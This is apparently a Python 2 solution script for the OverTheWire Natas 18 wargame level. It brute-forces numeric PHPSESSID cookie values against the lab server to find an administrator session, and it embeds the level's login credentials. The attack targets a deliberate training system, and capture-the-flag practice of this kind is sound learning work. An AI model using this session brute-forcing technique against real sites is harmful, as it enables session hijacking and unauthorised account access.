#!/usr/bin/python
import httplib
import urllib
import base64
import requests

headers = {}
http_username = "natas18"
http_password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
url = "http://%s:%s@natas18.natas.labs.overthewire.org/index.php" % (http_username, http_password)


for sessionId in range(0, 641):
    cookies = {'PHPSESSID': "%d" % sessionId}
    r = requests.post(url, cookies=cookies)

    if r.status_code != 200:
        print "Server returned error!"
        print r.text
        break

    if 'regular user' not in r.text:
        print r.text
        break
